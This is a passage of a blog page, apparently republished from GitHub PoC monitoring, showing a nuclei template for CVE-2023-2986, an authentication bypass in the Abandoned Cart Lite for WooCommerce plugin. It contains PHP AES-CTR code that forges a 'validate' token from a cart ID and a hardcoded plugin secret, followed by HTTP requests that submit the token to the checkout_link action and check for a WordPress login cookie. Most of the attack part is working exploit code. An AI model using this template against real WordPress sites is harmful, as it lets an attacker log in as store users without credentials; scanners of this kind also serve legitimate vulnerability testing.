class="hljs-number">0x38</span>,</span><br><span class="language-php">              <span class="hljs-number">0xf5</span>,</span><br><span class="language-php">              <span class="hljs-number">0xbc</span>,</span><br><span class="language-php">              <span class="hljs-number">0xb6</span>,</span><br><span class="language-php">              <span class="hljs-number">0xda</span>,</span><br><span class="language-php">              <span class="hljs-number">0x21</span>,</span><br><span class="language-php">              <span class="hljs-number">0x10</span>,</span><br><span class="language-php">              <span class="hljs-number">0xff</span>,</span><br><span class="language-php">              <span class="hljs-number">0xf3</span>,</span><br><span class="language-php">              <span class="hljs-number">0xd2</span>,</span><br><span class="language-php">              <span class="hljs-number">0xcd</span>,</span><br><span class="language-php">              <span class="hljs-number">0x0c</span>,</span><br><span class="language-php">              <span class="hljs-number">0x13</span>,</span><br><span class="language-php">              <span class="hljs-number">0xec</span>,</span><br><span class="language-php">              <span class="hljs-number">0x5f</span>,</span><br><span class="language-php">              <span class="hljs-number">0x97</span>,</span><br><span class="language-php">              <span class="hljs-number">0x44</span>,</span><br><span class="language-php">              <span class="hljs-number">0x17</span>,</span><br><span class="language-php">              <span class="hljs-number">0xc4</span>,</span><br><span class="language-php">              <span class="hljs-number">0xa7</span>,</span><br><span class="language-php">              <span class="hljs-number">0x7e</span>,</span><br><span class="language-php">              <span class="hljs-number">0x3d</span>,</span><br><span class="language-php">              <span class="hljs-number">0x64</span>,</span><br><span class="language-php">              <span class="hljs-number">0x5d</span>,</span><br><span class="language-php">              <span class="hljs-number">0x19</span>,</span><br><span class="language-php">              <span class="hljs-number">0x73</span>,</span><br><span class="language-php">              <span class="hljs-number">0x60</span>,</span><br><span class="language-php">              <span class="hljs-number">0x81</span>,</span><br><span class="language-php">              <span class="hljs-number">0x4f</span>,</span><br><span class="language-php">              <span class="hljs-number">0xdc</span>,</span><br><span class="language-php">              <span class="hljs-number">0x22</span>,</span><br><span class="language-php">              <span class="hljs-number">0x2a</span>,</span><br><span class="language-php">              <span class="hljs-number">0x90</span>,</span><br><span class="language-php">              <span class="hljs-number">0x88</span>,</span><br><span class="language-php">              <span class="hljs-number">0x46</span>,</span><br><span class="language-php">              <span class="hljs-number">0xee</span>,</span><br><span class="language-php">              <span class="hljs-number">0xb8</span>,</span><br><span class="language-php">              <span class="hljs-number">0x14</span>,</span><br><span class="language-php">              <span class="hljs-number">0xde</span>,</span><br><span class="language-php">              <span class="hljs-number">0x5e</span>,</span><br><span class="language-php">              <span class="hljs-number">0x0b</span>,</span><br><span class="language-php">              <span class="hljs-number">0xdb</span>,</span><br><span class="language-php">              <span class="hljs-number">0xe0</span>,</span><br><span class="language-php">              <span class="hljs-number">0x32</span>,</span><br><span class="language-php">              <span class="hljs-number">0x3a</span>,</span><br><span class="language-php">              <span class="hljs-number">0x0a</span>,</span><br><span class="language-php">              <span class="hljs-number">0x49</span>,</span><br><span class="language-php">              <span class="hljs-number">0x06</span>,</span><br><span class="language-php">              <span class="hljs-number">0x24</span>,</span><br><span class="language-php">              <span class="hljs-number">0x5c</span>,</span><br><span class="language-php">              <span class="hljs-number">0xc2</span>,</span><br><span class="language-php">              <span class="hljs-number">0xd3</span>,</span><br><span class="language-php">              <span class="hljs-number">0xac</span>,</span><br><span class="language-php">              <span class="hljs-number">0x62</span>,</span><br><span class="language-php">              <span class="hljs-number">0x91</span>,</span><br><span class="language-php">              <span class="hljs-number">0x95</span>,</span><br><span class="language-php">              <span class="hljs-number">0xe4</span>,</span><br><span class="language-php">              <span class="hljs-number">0x79</span>,</span><br><span class="language-php">              <span class="hljs-number">0xe7</span>,</span><br><span class="language-php">              <span class="hljs-number">0xc8</span>,</span><br><span class="language-php">              <span class="hljs-number">0x37</span>,</span><br><span class="language-php">              <span class="hljs-number">0x6d</span>,</span><br><span class="language-php">              <span class="hljs-number">0x8d</span>,</span><br><span class="language-php">              <span class="hljs-number">0xd5</span>,</span><br><span class="language-php">              <span class="hljs-number">0x4e</span>,</span><br><span class="language-php">              <span class="hljs-number">0xa9</span>,</span><br><span class="language-php">              <span class="hljs-number">0x6c</span>,</span><br><span class="language-php">              <span class="hljs-number">0x56</span>,</span><br><span class="language-php">              <span class="hljs-number">0xf4</span>,</span><br><span class="language-php">              <span class="hljs-number">0xea</span>,</span><br><span class="language-php">              <span class="hljs-number">0x65</span>,</span><br><span class="language-php">              <span class="hljs-number">0x7a</span>,</span><br><span class="language-php">              <span class="hljs-number">0xae</span>,</span><br><span class="language-php">              <span class="hljs-number">0x08</span>,</span><br><span class="language-php">              <span class="hljs-number">0xba</span>,</span><br><span class="language-php">              <span class="hljs-number">0x78</span>,</span><br><span class="language-php">              <span class="hljs-number">0x25</span>,</span><br><span class="language-php">              <span class="hljs-number">0x2e</span>,</span><br><span class="language-php">              <span class="hljs-number">0x1c</span>,</span><br><span class="language-php">              <span class="hljs-number">0xa6</span>,</span><br><span class="language-php">              <span class="hljs-number">0xb4</span>,</span><br><span class="language-php">              <span class="hljs-number">0xc6</span>,</span><br><span class="language-php">              <span class="hljs-number">0xe8</span>,</span><br><span class="language-php">              <span class="hljs-number">0xdd</span>,</span><br><span class="language-php">              <span class="hljs-number">0x74</span>,</span><br><span class="language-php">              <span class="hljs-number">0x1f</span>,</span><br><span class="language-php">              <span class="hljs-number">0x4b</span>,</span><br><span class="language-php">              <span class="hljs-number">0xbd</span>,</span><br><span class="language-php">              <span class="hljs-number">0x8b</span>,</span><br><span class="language-php">              <span class="hljs-number">0x8a</span>,</span><br><span class="language-php">              <span class="hljs-number">0x70</span>,</span><br><span class="language-php">              <span class="hljs-number">0x3e</span>,</span><br><span class="language-php">              <span class="hljs-number">0xb5</span>,</span><br><span class="language-php">              <span class="hljs-number">0x66</span>,</span><br><span class="language-php">              <span class="hljs-number">0x48</span>,</span><br><span class="language-php">              <span class="hljs-number">0x03</span>,</span><br><span class="language-php">              <span class="hljs-number">0xf6</span>,</span><br><span class="language-php">              <span class="hljs-number">0x0e</span>,</span><br><span class="language-php">              <span class="hljs-number">0x61</span>,</span><br><span class="language-php">              <span class="hljs-number">0x35</span>,</span><br><span class="language-php">              <span class="hljs-number">0x57</span>,</span><br><span class="language-php">              <span class="hljs-number">0xb9</span>,</span><br><span class="language-php">              <span class="hljs-number">0x86</span>,</span><br><span class="language-php">              <span class="hljs-number">0xc1</span>,</span><br><span class="language-php">              <span class="hljs-number">0x1d</span>,</span><br><span class="language-php">              <span class="hljs-number">0x9e</span>,</span><br><span class="language-php">              <span class="hljs-number">0xe1</span>,</span><br><span class="language-php">              <span class="hljs-number">0xf8</span>,</span><br><span class="language-php">              <span class="hljs-number">0x98</span>,</span><br><span class="language-php">              <span class="hljs-number">0x11</span>,</span><br><span class="language-php">              <span class="hljs-number">0x69</span>,</span><br><span class="language-php">              <span class="hljs-number">0xd9</span>,</span><br><span class="language-php">              <span class="hljs-number">0x8e</span>,</span><br><span class="language-php">              <span class="hljs-number">0x94</span>,</span><br><span class="language-php">              <span class="hljs-number">0x9b</span>,</span><br><span class="language-php">              <span class="hljs-number">0x1e</span>,</span><br><span class="language-php">              <span class="hljs-number">0x87</span>,</span><br><span class="language-php">              <span class="hljs-number">0xe9</span>,</span><br><span class="language-php">              <span class="hljs-number">0xce</span>,</span><br><span class="language-php">              <span class="hljs-number">0x55</span>,</span><br><span class="language-php">              <span class="hljs-number">0x28</span>,</span><br><span class="language-php">              <span class="hljs-number">0xdf</span>,</span><br><span class="language-php">              <span class="hljs-number">0x8c</span>,</span><br><span class="language-php">              <span class="hljs-number">0xa1</span>,</span><br><span class="language-php">              <span class="hljs-number">0x89</span>,</span><br><span class="language-php">              <span class="hljs-number">0x0d</span>,</span><br><span class="language-php">              <span class="hljs-number">0xbf</span>,</span><br><span class="language-php">              <span class="hljs-number">0xe6</span>,</span><br><span class="language-php">              <span class="hljs-number">0x42</span>,</span><br><span class="language-php">              <span class="hljs-number">0x68</span>,</span><br><span class="language-php">              <span class="hljs-number">0x41</span>,</span><br><span class="language-php">              <span class="hljs-number">0x99</span>,</span><br><span class="language-php">              <span class="hljs-number">0x2d</span>,</span><br><span class="language-php">              <span class="hljs-number">0x0f</span>,</span><br><span class="language-php">              <span class="hljs-number">0xb0</span>,</span><br><span class="language-php">              <span class="hljs-number">0x54</span>,</span><br><span class="language-php">              <span class="hljs-number">0xbb</span>,</span><br><span class="language-php">              <span class="hljs-number">0x16</span>,</span><br><span class="language-php">          );</span><br><span class="language-php"></span><br><span class="language-php">          <span class="hljs-comment">// rCon is Round Constant used for the Key Expansion [1st col is 2^(r-1) in GF(2^8)] [�5.2]</span></span><br><span class="language-php">          <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$rCon</span> = <span class="hljs-keyword">array</span>(</span><br><span class="language-php">              <span class="hljs-keyword">array</span>( <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> ),</span><br><span class="language-php">              <span class="hljs-keyword">array</span>( <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> ),</span><br><span class="language-php">              <span class="hljs-keyword">array</span>( <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> ),</span><br><span class="language-php">              <span class="hljs-keyword">array</span>( <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> ),</span><br><span class="language-php">              <span class="hljs-keyword">array</span>( <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> ),</span><br><span class="language-php">              <span class="hljs-keyword">array</span>( <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> ),</span><br><span class="language-php">              <span class="hljs-keyword">array</span>( <span class="hljs-number">0x20</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> ),</span><br><span class="language-php">              <span class="hljs-keyword">array</span>( <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> ),</span><br><span class="language-php">              <span class="hljs-keyword">array</span>( <span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> ),</span><br><span class="language-php">              <span class="hljs-keyword">array</span>( <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> ),</span><br><span class="language-php">              <span class="hljs-keyword">array</span>( <span class="hljs-number">0x36</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> ),</span><br><span class="language-php">          );</span><br><span class="language-php"></span><br><span class="language-php">      &#125;</span><br><span class="language-php">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">urs</span>(<span class="hljs-params"> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span> </span>) </span>&#123;</span><br><span class="language-php">              <span class="hljs-variable">$a</span>  = <span class="hljs-title function_ invoke__">intval</span>( <span class="hljs-variable">$a</span> ) &amp; <span class="hljs-number">0xffffffff</span>;</span><br><span class="language-php">              <span class="hljs-variable">$b</span> &amp;= <span class="hljs-number">0x1f</span>; <span class="hljs-comment">// (bounds check)</span></span><br><span class="language-php">              <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$a</span> &amp; <span class="hljs-number">0x80000000</span> &amp;&amp; <span class="hljs-variable">$b</span> &gt; <span class="hljs-number">0</span> ) &#123; <span class="hljs-comment">// if left-most bit set.</span></span><br><span class="language-php">                  <span class="hljs-variable">$a</span>     = ( <span class="hljs-variable">$a</span> &gt;&gt; <span class="hljs-number">1</span> ) &amp; <span class="hljs-number">0x7fffffff</span>; <span class="hljs-comment">// right-shift one bit &amp; clear left-most bit.</span></span><br><span class="language-php">                  <span class="hljs-variable">$check</span> = <span class="hljs-variable">$b</span> - <span class="hljs-number">1</span>;</span><br><span class="language-php">                  <span class="hljs-variable">$a</span>     = <span class="hljs-variable">$a</span> &gt;&gt; ( <span class="hljs-variable">$check</span> ); <span class="hljs-comment">// remaining right-shifts.</span></span><br><span class="language-php">              &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// otherwise.</span></span><br><span class="language-php">                  <span class="hljs-variable">$a</span> = ( <span class="hljs-variable">$a</span> &gt;&gt; <span class="hljs-variable">$b</span> ); <span class="hljs-comment">// use normal right-shift.</span></span><br><span class="language-php">              &#125;</span><br><span class="language-php">              <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>;</span><br><span class="language-php">        &#125;</span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params"> <span class="hljs-variable">$plaintext</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$nBits</span> </span>) </span>&#123;</span><br><span class="language-php">              <span class="hljs-variable">$blockSize</span> = <span class="hljs-number">16</span>; <span class="hljs-comment">// block size fixed at 16 bytes / 128 bits (Nb=4) for AES</span></span><br><span class="language-php">              <span class="hljs-keyword">if</span> ( ! ( <span class="hljs-variable">$nBits</span> == <span class="hljs-number">128</span> || <span class="hljs-variable">$nBits</span> == <span class="hljs-number">192</span> || <span class="hljs-variable">$nBits</span> == <span class="hljs-number">256</span> ) ) &#123;</span><br><span class="language-php">                  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>; <span class="hljs-comment">// standard allows 128/192/256 bit keys</span></span><br><span class="language-php">              &#125;</span><br><span class="language-php">              <span class="hljs-comment">// note PHP (5) gives us plaintext and password in UTF8 encoding!</span></span><br><span class="language-php"></span><br><span class="language-php">              <span class="hljs-comment">// use AES itself to encrypt password to get cipher key (using plain password as source for</span></span><br><span class="language-php">              <span class="hljs-comment">// key expansion) - gives us well encrypted key</span></span><br><span class="language-php">              <span class="hljs-variable">$nBytes</span>  = <span class="hljs-variable">$nBits</span> / <span class="hljs-number">8</span>; <span class="hljs-comment">// no bytes in key</span></span><br><span class="language-php">              <span class="hljs-variable">$pwBytes</span> = <span class="hljs-keyword">array</span>();</span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$nBytes</span>;</span><br><span class="language-php">              <span class="hljs-variable">$i</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-variable">$pwBytes</span>[ <span class="hljs-variable">$i</span> ] = <span class="hljs-title function_ invoke__">ord</span>( <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$password</span>, <span class="hljs-variable">$i</span>, <span class="hljs-number">1</span> ) ) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="language-php">              &#125;</span><br><span class="language-php">              <span class="hljs-variable">$key</span> = <span class="hljs-title class_">Wcal_Aes</span>::<span class="hljs-title function_ invoke__">cipher</span>( <span class="hljs-variable">$pwBytes</span>, <span class="hljs-title class_">Wcal_Aes</span>::<span class="hljs-title function_ invoke__">keyExpansion</span>( <span class="hljs-variable">$pwBytes</span> ) );</span><br><span class="language-php">              <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_merge</span>( <span class="hljs-variable">$key</span>, <span class="hljs-title function_ invoke__">array_slice</span>( <span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$nBytes</span> - <span class="hljs-number">16</span> ) ); <span class="hljs-comment">// expand key to 16/24/32 bytes long</span></span><br><span class="language-php"></span><br><span class="language-php">              <span class="hljs-comment">// initialise 1st 8 bytes of counter block with nonce (NIST SP800-38A �B.2): [0-1] = millisec,</span></span><br><span class="language-php">              <span class="hljs-comment">// [2-3] = random, [4-7] = seconds, giving guaranteed sub-ms uniqueness up to Feb 2106</span></span><br><span class="language-php">              <span class="hljs-variable">$counterBlock</span> = <span class="hljs-keyword">array</span>();</span><br><span class="language-php">              <span class="hljs-variable">$nonce</span>        = <span class="hljs-title function_ invoke__">floor</span>( <span class="hljs-title function_ invoke__">microtime</span>( <span class="hljs-literal">true</span> ) * <span class="hljs-number">1000</span> ); <span class="hljs-comment">// timestamp: milliseconds since 1-Jan-1970</span></span><br><span class="language-php">              <span class="hljs-variable">$nonceMs</span>      = <span class="hljs-variable">$nonce</span> % <span class="hljs-number">1000</span>;</span><br><span class="language-php">              <span class="hljs-variable">$nonceSec</span>     = <span class="hljs-title function_ invoke__">floor</span>( <span class="hljs-variable">$nonce</span> / <span class="hljs-number">1000</span> );</span><br><span class="language-php">              <span class="hljs-variable">$nonceRnd</span>     = <span class="hljs-title function_ invoke__">floor</span>( <span class="hljs-title function_ invoke__">rand</span>( <span class="hljs-number">0</span>, <span class="hljs-number">0xffff</span> ) );</span><br><span class="language-php"></span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">2</span>;</span><br><span class="language-php">              <span class="hljs-variable">$i</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-variable">$counterBlock</span>[ <span class="hljs-variable">$i</span> ] = <span class="hljs-title function_ invoke__">urs</span>( <span class="hljs-variable">$nonceMs</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="language-php">              &#125;</span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">2</span>;</span><br><span class="language-php">              <span class="hljs-variable">$i</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-variable">$counterBlock</span>[ <span class="hljs-variable">$i</span> + <span class="hljs-number">2</span> ] = <span class="hljs-title function_ invoke__">urs</span>( <span class="hljs-variable">$nonceRnd</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="language-php">              &#125;</span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>;</span><br><span class="language-php">              <span class="hljs-variable">$i</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-variable">$counterBlock</span>[ <span class="hljs-variable">$i</span> + <span class="hljs-number">4</span> ] = <span class="hljs-title function_ invoke__">urs</span>( <span class="hljs-variable">$nonceSec</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="language-php">              &#125;</span><br><span class="language-php"></span><br><span class="language-php">              <span class="hljs-comment">// and convert it to a string to go on the front of the ciphertext</span></span><br><span class="language-php">              <span class="hljs-variable">$ctrTxt</span> = <span class="hljs-string">&#x27;&#x27;</span>;</span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">8</span>;</span><br><span class="language-php">              <span class="hljs-variable">$i</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-variable">$ctrTxt</span> .= <span class="hljs-title function_ invoke__">chr</span>( <span class="hljs-variable">$counterBlock</span>[ <span class="hljs-variable">$i</span> ] );</span><br><span class="language-php">              &#125;</span><br><span class="language-php"></span><br><span class="language-php">              <span class="hljs-comment">// generate key schedule - an expansion of the key into distinct Key Rounds for each round</span></span><br><span class="language-php">              <span class="hljs-variable">$keySchedule</span> = <span class="hljs-title class_">Wcal_Aes</span>::<span class="hljs-title function_ invoke__">keyExpansion</span>( <span class="hljs-variable">$key</span> );</span><br><span class="language-php">              <span class="hljs-comment">// print_r($keySchedule);</span></span><br><span class="language-php"></span><br><span class="language-php">              <span class="hljs-variable">$blockCount</span> = <span class="hljs-title function_ invoke__">ceil</span>( <span class="hljs-title function_ invoke__">strlen</span>( <span class="hljs-variable">$plaintext</span> ) / <span class="hljs-variable">$blockSize</span> );</span><br><span class="language-php">              <span class="hljs-variable">$ciphertxt</span>  = <span class="hljs-keyword">array</span>(); <span class="hljs-comment">// ciphertext as array of strings</span></span><br><span class="language-php"></span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$b</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$b</span> &lt; <span class="hljs-variable">$blockCount</span>; <span class="hljs-variable">$b</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-comment">// set counter (block #) in last 8 bytes of counter block (leaving nonce in 1st 8 bytes)</span></span><br><span class="language-php">                  <span class="hljs-comment">// done in two stages for 32-bit ops: using two words allows us to go past 2^32 blocks (68GB)</span></span><br><span class="language-php">                  <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$c</span> &lt; <span class="hljs-number">4</span>;</span><br><span class="language-php">                  <span class="hljs-variable">$c</span>++ ) &#123;</span><br><span class="language-php">                      <span class="hljs-variable">$counterBlock</span>[ <span class="hljs-number">15</span> - <span class="hljs-variable">$c</span> ] = <span class="hljs-title function_ invoke__">urs</span>( <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span> * <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="language-php">                  &#125;</span><br><span class="language-php">                  <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$c</span> &lt; <span class="hljs-number">4</span>;</span><br><span class="language-php">                  <span class="hljs-variable">$c</span>++ ) &#123;</span><br><span class="language-php">                      <span class="hljs-variable">$counterBlock</span>[ <span class="hljs-number">15</span> - <span class="hljs-variable">$c</span> - <span class="hljs-number">4</span> ] = <span class="hljs-title function_ invoke__">urs</span>( <span class="hljs-variable">$b</span> / <span class="hljs-number">0x100000000</span>, <span class="hljs-variable">$c</span> * <span class="hljs-number">8</span> );</span><br><span class="language-php">                  &#125;</span><br><span class="language-php"></span><br><span class="language-php">                  <span class="hljs-variable">$cipherCntr</span> = <span class="hljs-title class_">Wcal_Aes</span>::<span class="hljs-title function_ invoke__">cipher</span>( <span class="hljs-variable">$counterBlock</span>, <span class="hljs-variable">$keySchedule</span> ); <span class="hljs-comment">// -- encrypt counter block --</span></span><br><span class="language-php"></span><br><span class="language-php">                  <span class="hljs-comment">// block size is reduced on final block</span></span><br><span class="language-php">                  <span class="hljs-variable">$blockLength</span> = <span class="hljs-variable">$b</span> &lt; <span class="hljs-variable">$blockCount</span> - <span class="hljs-number">1</span> ? <span class="hljs-variable">$blockSize</span> : ( <span class="hljs-title function_ invoke__">strlen</span>( <span class="hljs-variable">$plaintext</span> ) - <span class="hljs-number">1</span> ) % <span class="hljs-variable">$blockSize</span> + <span class="hljs-number">1</span>;</span><br><span class="language-php">                  <span class="hljs-variable">$cipherByte</span>  = <span class="hljs-keyword">array</span>();</span><br><span class="language-php"></span><br><span class="language-php">                  <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$blockLength</span>; <span class="hljs-variable">$i</span>++ ) &#123; <span class="hljs-comment">// -- xor plaintext with ciphered counter byte-by-byte --</span></span><br><span class="language-php">                      <span class="hljs-variable">$cipherByte</span>[ <span class="hljs-variable">$i</span> ] = <span class="hljs-variable">$cipherCntr</span>[ <span class="hljs-variable">$i</span> ] ^ <span class="hljs-title function_ invoke__">ord</span>( <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$plaintext</span>, <span class="hljs-variable">$b</span> * <span class="hljs-variable">$blockSize</span> + <span class="hljs-variable">$i</span>, <span class="hljs-number">1</span> ) );</span><br><span class="language-php">                      <span class="hljs-variable">$cipherByte</span>[ <span class="hljs-variable">$i</span> ] = <span class="hljs-title function_ invoke__">chr</span>( <span class="hljs-variable">$cipherByte</span>[ <span class="hljs-variable">$i</span> ] );</span><br><span class="language-php">                  &#125;</span><br><span class="language-php">                  <span class="hljs-variable">$ciphertxt</span>[ <span class="hljs-variable">$b</span> ] = <span class="hljs-title function_ invoke__">implode</span>( <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$cipherByte</span> ); <span class="hljs-comment">// escape troublesome characters in ciphertext</span></span><br><span class="language-php">              &#125;</span><br><span class="language-php"></span><br><span class="language-php">              <span class="hljs-comment">// implode is more efficient than repeated string concatenation</span></span><br><span class="language-php">              <span class="hljs-variable">$ciphertext</span> = <span class="hljs-variable">$ctrTxt</span> . <span class="hljs-title function_ invoke__">implode</span>( <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$ciphertxt</span> );</span><br><span class="language-php">              <span class="hljs-variable">$ciphertext</span> = <span class="hljs-title function_ invoke__">base64_encode</span>( <span class="hljs-variable">$ciphertext</span> );</span><br><span class="language-php">              <span class="hljs-keyword">return</span> <span class="hljs-variable">$ciphertext</span>;</span><br><span class="language-php">          &#125;</span><br><span class="language-php">          <span class="hljs-variable">$validate_val</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;cart_id&#x27;</span>).<span class="hljs-string">&#x27;&amp;url=&#x27;</span>. <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;Scheme&#x27;</span>) . <span class="hljs-string">&#x27;://&#x27;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;Host&#x27;</span>). <span class="hljs-string">&#x27;:&#x27;</span>. <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;Port&#x27;</span>) .<span class="hljs-string">&#x27;/checkout/&#x27;</span>;</span><br><span class="language-php">          <span class="hljs-variable">$secret</span> = <span class="hljs-string">&#x27;qJB0rGtIn5UB1xG03efyCp&#x27;</span>;</span><br><span class="language-php">          <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encrypt</span>(<span class="hljs-variable">$validate_val</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">256</span>) . <span class="hljs-string">&quot;:&quot;</span> . <span class="hljs-title function_ invoke__">encrypt</span>(<span class="hljs-variable">$validate_val</span>,<span class="hljs-variable">$secret</span> , <span class="hljs-number">256</span>);</span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php">http:</span><br><span class="language-php"></span><br><span class="language-php">  - method: GET</span><br><span class="language-php">    path:</span><br><span class="language-php">      - <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/?wcal_action=checkout_link&amp;user_email=test&amp;validate=&#123;&#123;replace_regex(code_response,&#x27;(.*:)&#x27;,&#x27;&#x27;)&#125;&#125;&quot;</span></span><br><span class="language-php">    headers:</span><br><span class="language-php"></span><br><span class="language-php">  - method: GET</span><br><span class="language-php">    path:</span><br><span class="language-php">      - <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/?wcal_action=checkout_link&amp;user_email=test&amp;validate=&#123;&#123;replace_regex(code_response,&#x27;(:.*)&#x27;,&#x27;&#x27;)&#125;&#125;&quot;</span></span><br><span class="language-php">    headers:</span><br><span class="language-php"></span><br><span class="language-php">    stop-at-first-<span class="hljs-keyword">match</span>: <span class="hljs-literal">true</span></span><br><span class="language-php"></span><br><span class="language-php">    matchers-condition: <span class="hljs-keyword">and</span></span><br><span class="language-php">    matchers:</span><br><span class="language-php">      - type: word</span><br><span class="language-php">        part: header</span><br><span class="language-php">        words:</span><br><span class="language-php">          - <span class="hljs-string">&quot;wordpress_logged_in_&quot;</span></span><br><span class="language-php">          - <span class="hljs-string">&quot;/checkout/&quot;</span></span><br><span class="language-php">        condition: <span class="hljs-keyword">and</span></span><br><span class="language-php"></span><br><span class="language-php">      - type: word</span><br><span class="language-php">        part: body</span><br><span class="language-php">        words:</span><br><span class="language-php">          - <span class="hljs-string">&quot;Link expired&quot;</span></span><br><span class="language-php">        negative: <span class="hljs-literal">true</span></span><br><span class="language-php"></span><br><span class="language-php">      - type: status</span><br><span class="language-php">        status:</span><br><span class="language-php">          - <span class="hljs-number">302</span></span><br><span class="language-php"></span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Github-Poc-%E7%9B%91%E6%8E%A7/" class="category-chain-item">Github Poc 监控</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/projectdiscovery-nuclei-templates-github-issues/" class="print-no-link">#projectdiscovery/nuclei-templates:github issues</a>
      
        <a href="/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/" class="print-no-link">#权限绕过</a>
      
        <a href="/tags/CVE-2023-2986/" class="print-no-link">#CVE-2023-2986</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Abandoned Cart Lite for WooCommerce 认证绕过漏洞</div>
      <div>http://example.com/2025/06/03/github_1996286128/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>lianccc</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年6月3日</div>
        </div>
      
      
      
